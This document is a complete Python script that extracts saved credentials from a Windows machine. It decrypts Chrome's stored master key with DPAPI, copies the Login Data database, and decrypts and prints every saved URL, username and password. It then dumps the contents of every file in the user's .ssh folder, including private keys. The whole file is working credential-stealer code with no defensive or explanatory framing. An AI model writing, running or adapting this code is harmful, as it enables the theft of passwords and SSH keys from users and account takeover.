import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

temp_db = "Loginvault.db"


def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r",
              encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"


def get_ssh():
    ssh_folder_path = os.path.join(os.environ['USERPROFILE'], '.ssh')

    try:
        if os.path.exists(ssh_folder_path):
            for filename in os.listdir(ssh_folder_path):
                file_path = os.path.join(ssh_folder_path, filename)
                with open(file_path, 'r') as ssh_file:
                    file_contents = ssh_file.read()
                    print(f"File: {filename}\nContents: {file_contents}\n{'*' * 50}\n")
        else:
            print(".ssh folder not found.")
    except Exception as e:
        print(f"Error processing .ssh folder: {e}")


if __name__ == '__main__':
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    shutil.copy2(login_db, temp_db)  # making a temp copy since Login Data DB is locked while Chrome is running
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            print(
                "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
    except Exception as e:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove(temp_db)
    except Exception as e:
        pass
    get_ssh()